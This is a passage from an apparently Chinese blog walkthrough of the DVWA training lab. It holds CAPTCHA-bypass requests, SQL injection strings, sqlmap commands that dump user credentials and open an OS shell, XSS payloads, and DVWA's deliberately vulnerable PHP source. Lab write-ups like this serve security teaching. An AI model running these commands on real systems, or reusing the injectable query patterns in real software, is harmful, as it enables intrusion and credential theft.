class="line">3</span><br></pre></td><td class="code"><pre><span class="line">step=2&amp;password_new=123&amp;password_conf=123&amp;Change=Change</span><br><span class="line"></span><br><span class="line">Password Changed.</span><br></pre></td></tr></table></figure><h3 id="medium-6"><a class="markdownIt-Anchor" href="#medium-6">#</a> Medium</h3><ul><li>修改包的参数 step=2。</li><li>查看源码得知新变量 passed_captcha，谷歌返回情况，将其 POST 为 true。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">step=2&amp;password_new=123&amp;password_conf=123&amp;Change=Change&amp;passed_captcha=true</span><br></pre></td></tr></table></figure><h3 id="high-6"><a class="markdownIt-Anchor" href="#high-6">#</a> High</h3><ul><li>添加如下信息至包中</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: reCAPTCHA</span><br><span class="line">step=1&amp;password_new=123&amp;password_conf=123&amp;user_token=2143b157158c8dce48d7b94d045bad71&amp;Change=Change&amp;g-recaptcha-response=hidd3n_valu3</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="sql-injection"><a class="markdownIt-Anchor" href="#sql-injection">#</a> SQL Injection</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//SQL Injection</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Impossible SQL Injection Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered?</span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( <span class="variable">$id</span> )) &#123;</span><br><span class="line">        <span class="comment">// Check the database</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:id&#x27;</span>, <span class="variable">$id</span>, PDO::PARAM_INT );</span><br><span class="line">        <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$data</span>-&gt;fetch();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Make sure only 1 result is returned</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$data</span>-&gt;rowCount() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// Get values</span></span><br><span class="line">            <span class="variable">$first</span> = <span class="variable">$row</span>[ <span class="string">&#x27;first_name&#x27;</span> ];</span><br><span class="line">            <span class="variable">$last</span>  = <span class="variable">$row</span>[ <span class="string">&#x27;last_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//High SQL Injection Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_SESSION</span> [ <span class="string">&#x27;id&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_SESSION</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$row</span> = mysqli_fetch_assoc( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);        </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Medium SQL Injection Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$id</span> = mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="subst">$id</span>;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$row</span> = mysqli_fetch_assoc( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Display values</span></span><br><span class="line">        <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This is used later on in the index.php page</span></span><br><span class="line"><span class="comment">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span></span><br><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;SELECT COUNT(*) FROM users;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"><span class="variable">$number_of_rows</span> = mysqli_fetch_row( <span class="variable">$result</span> )[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Low SQL Injection Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$row</span> = mysqli_fetch_assoc( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="low-7"><a class="markdownIt-Anchor" href="#low-7">#</a> Low</h3><p>特点：GET</p><ul><li>1</li><li>1’//wrong</li><li>1’ or 1=1–</li><li>1’ union select 1,database()–</li><li>sqlmap</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://0.0.0.0/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;security=low; PHPSESSID=cqve1uen4svrvfnlga3j892sb4&quot; -D dvwa -T users -C user,password --dump </span><br></pre></td></tr></table></figure><h3 id="medium-7"><a class="markdownIt-Anchor" href="#medium-7">#</a> Medium</h3><p>特点：POST</p><ul><li>手工注入</li><li>id=1 union select 1,table_name from information_schema=dvwa–</li><li>HEX 加密关键字</li><li>id=1 union select 1,table_name from information_schema=0x64767761–</li><li>sqlmap --data 参数</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">脱裤</span></span><br><span class="line">sqlmap -u &quot;http://192.168.23.133/dvwa/vulnerabilities/sqli/#&quot; --data &quot;id=2&amp;Submit=Submit&quot; --cookie &quot;security=medium; PHPSESSID=cqve1uen4svrvfnlga3j892sb4&quot; -D dvwa -T users -C user,password --dump --batch</span><br><span class="line"><span class="meta">#</span><span class="bash">上马</span></span><br><span class="line">lmap -u &quot;http://192.168.23.133/dvwa/vulnerabilities/sqli/#&quot; --data &quot;id=2&amp;Submit=Submit&quot; --cookie &quot;security=medium; PHPSESSID=cqve1uen4svrvfnlga3j892sb4&quot; -D dvwa -T users -C user,password --os-shell</span><br><span class="line"><span class="meta">#</span><span class="bash">需要加绝对路径，可以利用phpinfo()</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="high-7"><a class="markdownIt-Anchor" href="#high-7">#</a> High</h3><p>特点：返回到不同页面</p><ul><li>手动无差别</li><li>sqlmap --second-url 参数</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.23.133/dvwa/vulnerabilities/sqli/session-input.php&quot; --data &quot;id=2&amp;Submit=Submit&quot; --cookie &quot;security=high; PHPSESSID=cqve1uen4svrvfnlga3j892sb4&quot; --second-url &quot;http://192.168.23.133/dvwa/vulnerabilities/sqli/&quot;-D dvwa -T users -C user,password --dump --batch</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210424185429439.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210424185429439"></p><h2 id="sql-injection-blind"><a class="markdownIt-Anchor" href="#sql-injection-blind">#</a> SQL Injection (Blind)</h2><h3 id="low-8"><a class="markdownIt-Anchor" href="#low-8">#</a> Low</h3><ul><li>手注过于麻烦不演示</li><li>sqlmap</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.23.133/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; -p &quot;id&quot; --cookie &quot;security=low; PHPSESSID=f48dupm9bkmo862t404a2hmvl1&quot; -D dvwa -T users -C user,password --dump --batch</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="medium-8"><a class="markdownIt-Anchor" href="#medium-8">#</a> Medium</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u&quot;http://192.168.23.133/dvwa/vulnerabilities/sqli_blind/#&quot; --data &quot;id=1&amp;Submit=Submit&quot; -p &quot;id&quot; --cookie &quot;security=medium; PHPSESSID=o5v0fkp2cld3nef9aninvap224&quot; -D dvwa -T users -C user,password --dump --batch</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="high-8"><a class="markdownIt-Anchor" href="#high-8">#</a> High</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;192.168.23.133/dvwa/vulnerabilities/sqli_blind/cookie-input.php&quot; --data &quot;id=2&amp;Submit=Submit&quot; --cookie &quot;id=1; security=high; PHPSESSID=o5v0fkp2cld3nef9aninvap224&quot; --second-url &quot;http://192.168.23.133/dvwa/vulnerabilities/sqli_blind/&quot; -D dvwa -T users -C user,password --dump --batch</span><br></pre></td></tr></table></figure><h2 id="weak-session-ids"><a class="markdownIt-Anchor" href="#weak-session-ids">#</a> Weak Session IDs</h2><h3 id="low-9"><a class="markdownIt-Anchor" href="#low-9">#</a> Low</h3><h3 id="medium-9"><a class="markdownIt-Anchor" href="#medium-9">#</a> Medium</h3><h3 id="high-9"><a class="markdownIt-Anchor" href="#high-9">#</a> High</h3><h2 id="dom-based-cross-site-scripting-xss"><a class="markdownIt-Anchor" href="#dom-based-cross-site-scripting-xss">#</a> DOM Based Cross Site Scripting (XSS)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//DOM Based Cross Site Scripting (XSS) Vulnerability</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Impossible Unknown Vulnerability Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Don&#x27;t need to do anything, protction handled on the client side</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//High Unknown Vulnerability Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">&quot;default&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; !is_null (<span class="variable">$_GET</span>[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># White list the allowable languages</span></span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;default&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;French&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;English&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;German&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;Spanish&quot;</span>:</span><br><span class="line">            <span class="comment"># ok</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            header (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Medium Unknown Vulnerability Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">&quot;default&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; !is_null (<span class="variable">$_GET</span>[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line">    <span class="variable">$default</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;default&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Do not allow script tags</span></span><br><span class="line">    <span class="keyword">if</span> (stripos (<span class="variable">$default</span>, <span class="string">&quot;&lt;script&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        header (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Low Unknown Vulnerability Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># No protections, anything goes</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="low-10"><a class="markdownIt-Anchor" href="#low-10">#</a> Low</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="medium-10"><a class="markdownIt-Anchor" href="#medium-10">#</a> Medium</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">option</span>&gt;</span><span class="tag">&lt;/<span class="name">select</span>&gt;</span><span class="tag">&lt;<span class="name">option</span>&gt;</span><span class="tag">&lt;<span class="name">select</span>&gt;</span>&lt;img%20src=&quot;x&quot;%20onerror=&quot;alert(1)&quot;/&gt;</span><br></pre></td></tr></table></figure><h3 id="high-10"><a class="markdownIt-Anchor" href="#high-10">#</a> High</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">English#<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">#之后的被过滤，不传到服务端</span><br></pre></td></tr></table></figure><h2 id="reflected-cross-site-scripting-xss"><a class="markdownIt-Anchor" href="#reflected-cross-site-scripting-xss">#</a> Reflected Cross Site Scripting (XSS)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Reflected XSS</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Impossible Reflected XSS Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = htmlspecialchars( <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//High Reflected XSS Source</span></span><br><span 